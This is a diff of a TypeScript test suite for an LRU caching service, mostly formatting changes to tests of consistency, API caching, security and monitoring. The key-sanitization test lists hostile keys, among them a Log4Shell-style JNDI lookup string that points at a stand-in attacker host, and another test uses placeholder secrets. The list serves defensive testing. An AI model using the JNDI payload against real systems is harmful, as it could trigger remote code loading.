         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Setup related data
@@ -1833,7 +1854,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should handle cache updates with consistency', () => {
       const consistencyCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Simulate distributed cache nodes
@@ -1875,7 +1896,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should handle cache versioning for consistency', () => {
       const versionedCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Version-aware cache entries
@@ -1907,7 +1928,12 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const coherenceCache2 = new LRUCache<string, any>({ maxSize: 30, maxMemoryBytes: 1024 });
 
       // Simulate coherence protocol
-      const coherenceLog: Array<{ node: number, operation: string, key: string, timestamp: number }> = [];
+      const coherenceLog: Array<{
+        node: number;
+        operation: string;
+        key: string;
+        timestamp: number;
+      }> = [];
 
       function coherentSet(node: number, key: string, value: any): void {
         if (node === 1) {
@@ -1954,7 +1980,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       expect(coherenceCache1.get('coherence:test')).toBeDefined();
 
       // Wait for coherence propagation
-      await new Promise(resolve => setTimeout(resolve, 100));
+      await new Promise((resolve) => setTimeout(resolve, 100));
 
       // Should now be available in node 2
       expect(coherenceCache2.get('coherence:test')).toBeDefined();
@@ -1966,7 +1992,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       expect(coherenceCache2.get('coherence:test')).toBeUndefined();
 
       // Wait for coherence propagation
-      await new Promise(resolve => setTimeout(resolve, 100));
+      await new Promise((resolve) => setTimeout(resolve, 100));
 
       // Should now be deleted from node 1
       expect(coherenceCache1.get('coherence:test')).toBeUndefined();
@@ -1987,7 +2013,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         userId: 'user_456',
         preferences: { theme: 'dark', language: 'en' },
         cart: [{ id: 'item1', quantity: 2 }],
-        lastActivity: Date.now()
+        lastActivity: Date.now(),
       };
 
       sessionCache.set('session:sess_abc123', sessionData);
@@ -2000,7 +2026,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const updatedSession = {
         ...sessionData,
         preferences: { ...sessionData.preferences, theme: 'light' },
-        lastActivity: Date.now()
+        lastActivity: Date.now(),
       };
 
       sessionCache.set('session:sess_abc123', updatedSession);
@@ -2014,34 +2040,37 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const apiCache = new LRUCache<string, any>({
         maxSize: 100,
         maxMemoryBytes: 5 * 1024 * 1024, // 5MB
-        ttlMs: 5 * 60 * 1000 // 5 minutes
+        ttlMs: 5 * 60 * 1000, // 5 minutes
       });
 
       const apiResponses = [
         {
           key: 'api:/users/123',
           value: { id: 123, name: 'John Doe', email: 'john@example.com' },
-          ttl: 300000 // 5 minutes
+          ttl: 300000, // 5 minutes
         },
         {
           key: 'api:/products',
-          value: [{ id: 1, name: 'Product 1' }, { id: 2, name: 'Product 2' }],
-          ttl: 600000 // 10 minutes
+          value: [
+            { id: 1, name: 'Product 1' },
+            { id: 2, name: 'Product 2' },
+          ],
+          ttl: 600000, // 10 minutes
         },
         {
           key: 'api:/stats',
           value: { users: 1000, products: 500, orders: 2500 },
-          ttl: 60000 // 1 minute
-        }
+          ttl: 60000, // 1 minute
+        },
       ];
 
       // Cache API responses
-      apiResponses.forEach(response => {
+      apiResponses.forEach((response) => {
         apiCache.set(response.key, response.value, response.ttl);
       });
 
       // Should retrieve cached responses
-      apiResponses.forEach(response => {
+      apiResponses.forEach((response) => {
         const cached = apiCache.get(response.key);
         expect(cached).toEqual(response.value);
       });
@@ -2058,7 +2087,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       // Cache expensive computation results
       const computationCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 2 * 1024 * 1024 // 2MB
+        maxMemoryBytes: 2 * 1024 * 1024, // 2MB
       });
 
       // Simulate expensive computation
@@ -2111,7 +2140,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       // Cache rendered templates or compiled results
       const templateCache = new LRUCache<string, any>({
         maxSize: 100,
-        maxMemoryBytes: 1 * 1024 * 1024 // 1MB
+        maxMemoryBytes: 1 * 1024 * 1024, // 1MB
       });
 
       // Simple template engine simulation
@@ -2157,16 +2186,16 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         { key: 'app:database', value: { host: 'localhost', port: 5432, name: 'myapp' } },
         { key: 'app:redis', value: { host: 'localhost', port: 6379, ttl: 3600 } },
         { key: 'app:features', value: { newDashboard: true, betaFeatures: false } },
-        { key: 'app:limits', value: { maxUsers: 1000, maxStorage: 1024 * 1024 * 1024 } }
+        { key: 'app:limits', value: { maxUsers: 1000, maxStorage: 1024 * 1024 * 1024 } },
       ];
 
       // Cache configurations
-      configurations.forEach(config => {
+      configurations.forEach((config) => {
         configCache.set(config.key, config.value);
       });
 
       // Should retrieve configurations quickly
-      configurations.forEach(config => {
+      configurations.forEach((config) => {
         const cached = configCache.get(config.key);
         expect(cached).toEqual(config.value);
       });
@@ -2175,7 +2204,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const updatedDbConfig = {
         host: 'prod-db.example.com',
         port: 5432,
-        name: 'myapp_prod'
+        name: 'myapp_prod',
       };
 
       configCache.set('app:database', updatedDbConfig);
@@ -2190,14 +2219,14 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should handle sensitive data securely', () => {
       const secureCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Simulate sensitive data
       const sensitiveData = {
         apiKey: 'sk-1234567890abcdef',
         password: 'super-secret-password',
-        token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
+        token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
       };
 
       // Should not store sensitive data in plain text
@@ -2218,7 +2247,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should handle cache key sanitization', () => {
       const sanitizedCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Potentially malicious keys
@@ -2228,10 +2257,10 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         'SELECT * FROM users',
         '${jndi:ldap://evil.com/a}',
         '\x00\x01\x02\x03',
-        'very long key that might cause buffer overflow'.repeat(100)
+        'very long key that might cause buffer overflow'.repeat(100),
       ];
 
-      suspiciousKeys.forEach(key => {
+      suspiciousKeys.forEach((key) => {
         // In a real implementation, keys would be sanitized
         // For testing, we just verify the cache handles them
         expect(() => {
@@ -2246,7 +2275,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should implement cache access control', () => {
       const accessControlledCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Simulate access control
@@ -2294,14 +2323,18 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should handle cache poisoning prevention', () => {
       const antiPoisonCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Validate data before caching
       function validateData(data: any): boolean {
         // Basic validation - in real implementation would be more comprehensive
         if (typeof data !== 'object' || data === null) return false;
-        if (data.hasOwnProperty('__proto__') || data.hasOwnProperty('constructor')) return false;
+        if (
+          Object.prototype.hasOwnProperty.call(data, '__proto__') ||
+          Object.prototype.hasOwnProperty.call(data, 'constructor')
+        )
+          return false;
         if (JSON.stringify(data).length > 10000) return false; // Size limit
         return true;
       }
@@ -2334,7 +2367,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should provide detailed performance metrics', () => {
       const monitoringCache = new LRUCache<string, any>({
         maxSize: 100,
-        maxMemoryBytes: 2 * 1024 * 1024
+        maxMemoryBytes: 2 * 1024 * 1024,
       });
 
       // Perform various operations
@@ -2373,7 +2406,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         maxSize: 50,
         maxMemoryBytes: 1024,
         ttlMs: 5000,
-        cleanupIntervalMs: 1000
+        cleanupIntervalMs: 1000,
       });
 
       // Simulate cache usage patterns that affect health
@@ -2403,9 +2436,11 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       // Health indicators
       const healthIndicators = {
         hitRate: unhealthyStats.hitRate,
-        evictionRate: unhealthyStats.evictedItems / (unhealthyStats.evictedItems + unhealthyStats.itemCount),
+        evictionRate:
+          unhealthyStats.evictedItems / (unhealthyStats.evictedItems + unhealthyStats.itemCount),
         memoryUtilization: unhealthyStats.memoryUsageBytes / unhealthyStats.maxMemoryBytes,
-        turnoverRate: (unhealthyStats.totalHits + unhealthyStats.totalMisses) / unhealthyStats.itemCount
+        turnoverRate:
+          (unhealthyStats.totalHits + unhealthyStats.totalMisses) / unhealthyStats.itemCount,
       };
 
       // Verify health tracking
@@ -2421,17 +2456,17 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const diagnosticCache = new LRUCache<string, any>({
         maxSize: 20,
         maxMemoryBytes: 1024,
-        ttlMs: 10000
+        ttlMs: 10000,
       });
 
       // Create predictable patterns for diagnostics
       const diagnosticData = [
         { key: 'diag:1', value: 'a'.repeat(50), accessPattern: 'frequent' },
         { key: 'diag:2', value: 'b'.repeat(30), accessPattern: 'moderate' },
-        { key: 'diag:3', value: 'c'.repeat(20), accessPattern: 'rare' }
+        { key: 'diag:3', value: 'c'.repeat(20), accessPattern: 'rare' },
       ];
 
-      diagnosticData.forEach(item => {
+      diagnosticData.forEach((item) => {
         diagnosticCache.set(item.key, item.value);
       });
 
@@ -2455,7 +2490,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const memoryAnalysis = {
         totalMemory: stats.memoryUsageBytes,
         averageItemSize: stats.memoryUsageBytes / stats.itemCount,
-        memoryEfficiency: stats.memoryUsageBytes / stats.maxMemoryBytes
+        memoryEfficiency: stats.memoryUsageBytes / stats.maxMemoryBytes,
       };
 
       expect(memoryAnalysis.totalMemory).toBeGreaterThan(0);
@@ -2469,7 +2504,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const reportCache = new LRUCache<string, any>({
         maxSize: 100,
         maxMemoryBytes: 5 * 1024 * 1024,
-        ttlMs: 30000
+        ttlMs: 30000,
       });
 
       // Generate realistic cache activity
@@ -2481,7 +2516,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         gets: 0,
         hits: 0,
         misses: 0,
-        evictions: 0
+        evictions: 0,
       };
 
       // Populate cache
@@ -2489,7 +2524,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         reportCache.set(`report-${i}`, {
           id: i,
           data: `data-${i}`,
-          size: Math.floor(Math.random() * 100) + 10
+          size: Math.floor(Math.random() * 100) + 10,
         });
         operations.sets++;
       }
@@ -2525,18 +2560,19 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           maxMemory: stats.maxMemoryBytes,
           hitRate: stats.hitRate,
           expiredItems: stats.expiredItems,
-          evictedItems: stats.evictedItems
+          evictedItems: stats.evictedItems,
         },
         metrics: {
           operationsPerSecond: operations.gets / ((endTime - startTime) / 1000),
           averageMemoryPerItem: stats.memoryUsageBytes / stats.itemCount,
           memoryUtilization: (stats.memoryUsageBytes / stats.maxMemoryBytes) * 100,
-          efficiency: (operations.hits / operations.gets) * 100
+          efficiency: (operations.hits / operations.gets) * 100,
         },
         health: {
           status: stats.hitRate > 70 ? 'healthy' : stats.hitRate > 40 ? 'warning' : 'critical',
-          recommendations: stats.hitRate < 50 ? ['Consider increasing cache size', 'Review access patterns'] : []
-        }
+          recommendations:
+            stats.hitRate < 50 ? ['Consider increasing cache size', 'Review access patterns'] : [],
+        },
       };
 
       // Verify report structure and values
@@ -2556,7 +2592,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should optimize cache size based on usage patterns', () => {
       const optimizedCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Simulate usage pattern to find optimal size
@@ -2583,7 +2619,8 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
 
       // Find size that captures 80% of accesses
       const targetCoverage = totalAccess * 0.8;
-      const optimalSize = cumulativeAccess.findIndex(item => item.cumulative >= targetCoverage) + 1;
+      const optimalSize =
+        cumulativeAccess.findIndex((item) => item.cumulative >= targetCoverage) + 1;
 
       expect(optimalSize).toBeGreaterThan(0);
       expect(optimalSize).toBeLessThanOrEqual(20);
@@ -2601,7 +2638,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const ttlOptimizedCache = new LRUCache<string, any>({
         maxSize: 100,
         maxMemoryBytes: 2048,
-        ttlMs: 60000 // Default 1 minute
+        ttlMs: 60000, // Default 1 minute
       });
 
       // Track access patterns for TTL optimization
@@ -2620,7 +2657,10 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           times.push(accessTime);
         }
 
-        accessTimes.set(key, times.sort((a, b) => a - b));
+        accessTimes.set(
+          key,
+          times.sort((a, b) => a - b)
+        );
         ttlOptimizedCache.set(key, { data: `value-${i}`, lastAccess: times[times.length - 1] });
       }
 
@@ -2639,7 +2679,8 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           intervals.push(times[i] - times[i - 1]);
         }
 
-        const avgInterval = intervals.reduce((sum, interval) => sum + interval, 0) / intervals.length;
+        const avgInterval =
+          intervals.reduce((sum, interval) => sum + interval, 0) / intervals.length;
         optimalTTLs.set(key, Math.min(avgInterval * 2, 3600000)); // 2x average interval, max 1 hour
       }
 
@@ -2663,11 +2704,11 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should optimize memory usage with compression simulation', () => {
       const compressionCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Simulate compression for large objects
-      function simulateCompress(data: any): { compressed: any, size: number } {
+      function simulateCompress(data: any): { compressed: any; size: number } {
         const serialized = JSON.stringify(data);
         const compressedSize = Math.floor(serialized.length * 0.6); // Simulate 40% compression
         return { compressed: data, size: compressedSize };
@@ -2690,7 +2731,8 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
 
           this.compressionStats.originalSize += originalSize;
           this.compressionStats.compressedSize += size;
-          this.compressionStats.compressionRatio = this.compressionStats.compressedSize / this.compressionStats.originalSize;
+          this.compressionStats.compressionRatio =
+            this.compressionStats.compressedSize / this.compressionStats.originalSize;
         },
 
         get(key: string): any {
@@ -2702,17 +2744,31 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
 
         getCompressionStats() {
           return this.compressionStats;
-        }
+        },
       };
 
       // Add compressible data
       const compressibleData = [
-        { key: 'comp-1', value: { text: 'Hello world '.repeat(100), metadata: { source: 'test' } } },
-        { key: 'comp-2', value: { items: Array.from({ length: 50 }, (_, i) => ({ id: i, name: `item-${i}` })) } },
-        { key: 'comp-3', value: { description: 'This is a long description that repeats many times to simulate compressible content. '.repeat(20) } }
+        {
+          key: 'comp-1',
+          value: { text: 'Hello world '.repeat(100), metadata: { source: 'test' } },
+        },
+        {
+          key: 'comp-2',
+          value: { items: Array.from({ length: 50 }, (_, i) => ({ id: i, name: `item-${i}` })) },
+        },
+        {
+          key: 'comp-3',
+          value: {
+            description:
+              'This is a long description that repeats many times to simulate compressible content. '.repeat(
+                20
+              ),
+          },
+        },
       ];
 
-      compressibleData.forEach(item => {
+      compressibleData.forEach((item) => {
         compressibleCache.set(item.key, item.value);
       });
 
@@ -2722,7 +2778,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       expect(stats.compressionRatio).toBeLessThan(1); // Should be less than 1 (compression occurred)
 
       // Verify data integrity
-      compressibleData.forEach(item => {
+      compressibleData.forEach((item) => {
         const retrieved = compressibleCache.get(item.key);
         expect(retrieved).toEqual(item.value);
       });
@@ -2733,7 +2789,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should optimize cache hit ratio through smart eviction', () => {
       const smartEvictionCache = new LRUCache<string, any>({
         maxSize: 20,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Track access patterns for smart eviction decisions
@@ -2765,18 +2821,21 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           // Return keys with lowest access scores
           const scores = Array.from(this.accessPatterns.entries()).map(([key, freq]) => ({
             key,
-            score: freq / (Date.now() - (this.lastAccessed.get(key) || Date.now()))
+            score: freq / (Date.now() - (this.lastAccessed.get(key) || Date.now())),
           }));
 
-          return scores.sort((a, b) => a.score - b.score).slice(0, 5).map(item => item.key);
-        }
+          return scores
+            .sort((a, b) => a.score - b.score)
+            .slice(0, 5)
+            .map((item) => item.key);
+        },
       };
 
       // Simulate access patterns
       const keys = Array.from({ length: 30 }, (_, i) => `smart-${i}`);
 
       // Add all keys
-      keys.forEach(key => {
+      keys.forEach((key) => {
         smartCache.set(key, { data: `value-for-${key}` });
       });
 
@@ -2798,7 +2857,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
 
       // Frequent keys should not be in eviction candidates
       const frequentKeys = keys.slice(0, 10);
-      frequentKeys.forEach(key => {
+      frequentKeys.forEach((key) => {
         expect(evictionCandidates).not.toContain(key);
       });
 
@@ -2811,7 +2870,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should handle cache recovery after corruption', () => {
       const resilientCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Add some data
@@ -2840,13 +2899,13 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should handle graceful degradation under memory pressure', () => {
       const gracefulCache = new LRUCache<string, any>({
         maxSize: 10,
-        maxMemoryBytes: 512 // Very small limit
+        maxMemoryBytes: 512, // Very small limit
       });
 
       const degradationMetrics = {
         normalOperations: 0,
         degradedOperations: 0,
-        failedOperations: 0
+        failedOperations: 0,
       };
 
       // Simulate operations under increasing memory pressure
@@ -2881,7 +2940,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should maintain consistency during concurrent operations', async () => {
       const consistencyCache = new LRUCache<string, any>({
         maxSize: 100,
-        maxMemoryBytes: 2048
+        maxMemoryBytes: 2048,
       });
 
       const consistencyErrors: string[] = [];
@@ -2900,7 +2959,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
               operationResults.set(key, value);
 
               // Small delay to increase chance of race conditions
-              await new Promise(resolve => setTimeout(resolve, Math.random() * 10));
+              await new Promise((resolve) => setTimeout(resolve, Math.random() * 10));
 
               // Read operation
               const retrieved = consistencyCache.get(key);
@@ -2939,15 +2998,19 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       // Simulate cache restart scenario
       const warmUpCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Simulate pre-restart cache state
       const preRestartData = [
-        { key: 'critical:user:123', value: { id: 123, name: 'Critical User' }, priority: 'critical' },
+        {
+          key: 'critical:user:123',
+          value: { id: 123, name: 'Critical User' },
+          priority: 'critical',
+        },
         { key: 'config:app', value: { version: '1.0', mode: 'production' }, priority: 'high' },
         { key: 'cache:stats', value: { hits: 1000, misses: 100 }, priority: 'medium' },
-        { key: 'temp:session:456', value: { data: 'temporary' }, priority: 'low' }
+        { key: 'temp:session:456', value: { data: 'temporary' }, priority: 'low' },
       ];
 
       // Simulate restart by destroying and recreating cache
@@ -2955,16 +3018,16 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
 
       const restartedCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       // Warm-up strategy: load by priority
       const warmUpSequence = ['critical', 'high', 'medium', 'low'];
       let warmUpItems = 0;
 
-      warmUpSequence.forEach(priority => {
-        const items = preRestartData.filter(item => item.priority === priority);
-        items.forEach(item => {
+      warmUpSequence.forEach((priority) => {
+        const items = preRestartData.filter((item) => item.priority === priority);
+        items.forEach((item) => {
           restartedCache.set(item.key, item.value);
           warmUpItems++;
         });
@@ -2990,7 +3053,8 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const partitionCache1 = new LRUCache<string, any>({ maxSize: 30, maxMemoryBytes: 1024 });
       const partitionCache2 = new LRUCache<string, any>({ maxSize: 30, maxMemoryBytes: 1024 });
 
-      const partitionLog: Array<{ event: string, node: number, key: string, timestamp: number }> = [];
+      const partitionLog: Array<{ event: string; node: number; key: string; timestamp: number }> =
+        [];
 
       // Simulate partition handling
       function handlePartition(node: number, key: string, value: any): void {
@@ -3030,7 +3094,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       expect(sharedResult).toBeDefined();
 
       // Verify partition was logged
-      const conflictEvents = partitionLog.filter(log => log.event === 'conflict');
+      const conflictEvents = partitionLog.filter((log) => log.event === 'conflict');
       expect(conflictEvents.length).toBeGreaterThan(0);
 
       partitionCache1.destroy();
@@ -3043,7 +3107,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should implement cache dependencies', () => {
       const dependencyCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       const dependencies = new Map<string, Set<string>>();
@@ -3053,7 +3117,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         dependencyCache.set(key, value);
 
         // Track dependencies
-        dependsOn.forEach(parent => {
+        dependsOn.forEach((parent) => {
           if (!dependencies.has(parent)) {
             dependencies.set(parent, new Set());
           }
@@ -3068,7 +3132,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         // Recursively invalidate dependents
         const dependents = dependencies.get(key);
         if (dependents) {
-          dependents.forEach(dependent => {
+          dependents.forEach((dependent) => {
             invalidateWithDependents(dependent);
           });
           dependencies.delete(key);
@@ -3102,25 +3166,29 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should implement cache versioning and migration', () => {
       const versionedCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       const cacheVersion = 2;
       const currentDataVersion = 2;
 
       // Version-aware cache operations
-      function setVersionedData(key: string, value: any, version: number = currentDataVersion): void {
+      function setVersionedData(
+        key: string,
+        value: any,
+        version: number = currentDataVersion
+      ): void {
         versionedCache.set(`${key}:v${version}`, {
           data: value,
           version,
-          createdAt: Date.now()
+          createdAt: Date.now(),
         });
 
         // Set latest pointer
         versionedCache.set(`${key}:latest`, {
           data: value,
           version,
-          createdAt: Date.now()
+          createdAt: Date.now(),
         });
       }
 
@@ -3159,7 +3227,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       expect(migratedItem.data).toEqual({
         name: 'Legacy Item',
         migrated: true,
-        newField: 'added in v2'
+        newField: 'added in v2',
       });
       expect(migratedItem.version).toBe(2);
 
@@ -3167,7 +3235,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const currentItem = getVersionedData('current:item');
       expect(currentItem.data).toEqual({
         name: 'Current Item',
-        newField: 'already here'
+        newField: 'already here',
       });
       expect(currentItem.version).toBe(2);
 
@@ -3177,18 +3245,25 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should implement cache analytics and insights', () => {
       const analyticsCache = new LRUCache<string, any>({
         maxSize: 100,
-        maxMemoryBytes: 2048
+        maxMemoryBytes: 2048,
       });
 
       const analytics = {
-        accessPatterns: new Map<string, { count: number, firstAccess: number, lastAccess: number }>(),
+        accessPatterns: new Map<
+          string,
+          { count: number; firstAccess: number; lastAccess: number }
+        >(),
         keyPatterns: new Map<string, number>(),
         sizeDistribution: [] as number[],
         ttlDistribution: [] as number[],
 
         recordAccess(key: string): void {
           const now = Date.now();
-          const pattern = this.accessPatterns.get(key) || { count: 0, firstAccess: now, lastAccess: now };
+          const pattern = this.accessPatterns.get(key) || {
+            count: 0,
+            firstAccess: now,
+            lastAccess: now,
+          };
           pattern.count++;
           pattern.lastAccess = now;
           this.accessPatterns.set(key, pattern);
@@ -3204,7 +3279,10 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         },
 
         generateInsights(): any {
-          const totalAccesses = Array.from(this.accessPatterns.values()).reduce((sum, p) => sum + p.count, 0);
+          const totalAccesses = Array.from(this.accessPatterns.values()).reduce(
+            (sum, p) => sum + p.count,
+            0
+          );
           const uniqueKeys = this.accessPatterns.size;
           const avgAccesses = totalAccesses / uniqueKeys;
 
@@ -3220,11 +3298,11 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
             summary: {
               totalAccesses,
               uniqueKeys,
-              avgAccessesPerKey: avgAccesses
+              avgAccessesPerKey: avgAccesses,
             },
             topKeys: topKeys.map(([key, pattern]) => ({ key, accesses: pattern.count })),
             topPatterns: topPatterns.map(([pattern, count]) => ({ pattern, count })),
-            recommendations: this.generateRecommendations(avgAccesses, uniqueKeys)
+            recommendations: this.generateRecommendations(avgAccesses, uniqueKeys),
           };
         },
 
@@ -3236,11 +3314,13 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           }
 
           if (uniqueKeys > 80) {
-            recommendations.push('High key diversity - consider cache warming for frequently accessed keys');
+            recommendations.push(
+              'High key diversity - consider cache warming for frequently accessed keys'
+            );
           }
 
           return recommendations;
-        }
+        },
       };
 
       // Enhanced cache with analytics
@@ -3265,7 +3345,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
 
         getAnalytics(): any {
           return this.analytics.generateInsights();
-        }
+        },
       };
 
       // Generate cache activity for analytics
@@ -3273,11 +3353,11 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         { key: 'user:123', value: { name: 'John', id: 123 } },
         { key: 'user:456', value: { name: 'Jane', id: 456 } },
         { key: 'config:app', value: { version: '1.0', env: 'prod' } },
-        { key: 'session:abc', value: { userId: 123, token: 'xyz' } }
+        { key: 'session:abc', value: { userId: 123, token: 'xyz' } },
       ];
 
       // Add data and simulate access patterns
-      testData.forEach(item => {
+      testData.forEach((item) => {
         analyticalCache.set(item.key, item.value);
       });
 
@@ -3312,12 +3392,12 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should implement cache prediction and optimization', () => {
       const predictionCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 1024
+        maxMemoryBytes: 1024,
       });
 
       const predictionModel = {
-        accessHistory: [] as Array<{ key: string, timestamp: number, context: any }>,
-        patterns: new Map<string, { frequency: number, contexts: any[] }>(),
+        accessHistory: [] as Array<{ key: string; timestamp: number; context: any }>,
+        patterns: new Map<string, { frequency: number; contexts: any[] }>(),
 
         recordAccess(key: string, context?: any): void {
           this.accessHistory.push({ key, timestamp: Date.now(), context });
@@ -3334,7 +3414,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           const recentAccess = this.accessHistory.slice(-100); // Last 100 accesses
           const frequencyMap = new Map<string, number>();
 
-          recentAccess.forEach(access => {
+          recentAccess.forEach((access) => {
             frequencyMap.set(access.key, (frequencyMap.get(access.key) || 0) + 1);
           });
 
@@ -3358,7 +3438,9 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
               .map(([key]) => key);
 
             if (rarelyAccessed.length > 0) {
-              suggestions.push(`Consider reducing TTL for ${rarelyAccessed.length} rarely accessed items`);
+              suggestions.push(
+                `Consider reducing TTL for ${rarelyAccessed.length} rarely accessed items`
+              );
             }
 
             // Find frequently accessed items
@@ -3367,12 +3449,14 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
               .map(([key]) => key);
 
             if (frequentlyAccessed.length > 0) {
-              suggestions.push(`Consider increasing TTL for ${frequentlyAccessed.length} frequently accessed items`);
+              suggestions.push(
+                `Consider increasing TTL for ${frequentlyAccessed.length} frequently accessed items`
+              );
             }
           }
 
           return suggestions;
-        }
+        },
       };
 
       // Enhanced cache with prediction
@@ -3395,7 +3479,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
 
         warmupPredicted(): void {
           const predicted = this.model.predictNextAccess();
-          predicted.forEach(key => {
+          predicted.forEach((key) => {
             if (!this.cache.has(key)) {
               // In real implementation, would load from backing store
               console.log(`Would warm up: ${key}`);
@@ -3405,17 +3489,17 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
 
         getOptimizations(): string[] {
           return this.model.getOptimizationSuggestions();
-        }
+        },
       };
 
       // Generate activity for prediction model
       const accessPatterns = [
         { key: 'predict:popular', frequency: 15, context: { user: 'premium' } },
         { key: 'predict:moderate', frequency: 8, context: { user: 'regular' } },
-        { key: 'predict:rare', frequency: 2, context: { user: 'guest' } }
+        { key: 'predict:rare', frequency: 2, context: { user: 'guest' } },
       ];
 
-      accessPatterns.forEach(pattern => {
+      accessPatterns.forEach((pattern) => {
         for (let i = 0; i < pattern.frequency; i++) {
           predictiveCache.set(pattern.key, { data: `data-for-${pattern.key}` }, pattern.context);
           predictiveCache.get(pattern.key, pattern.context);
@@ -3443,7 +3527,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         maxSize: 200,
         maxMemoryBytes: 5 * 1024 * 1024, // 5MB
         ttlMs: 15 * 60 * 1000, // 15 minutes
-        cleanupIntervalMs: 5 * 60 * 1000 // 5 minutes
+        cleanupIntervalMs: 5 * 60 * 1000, // 5 minutes
       });
 
       // Simulate real-world cache usage patterns
@@ -3453,14 +3537,15 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
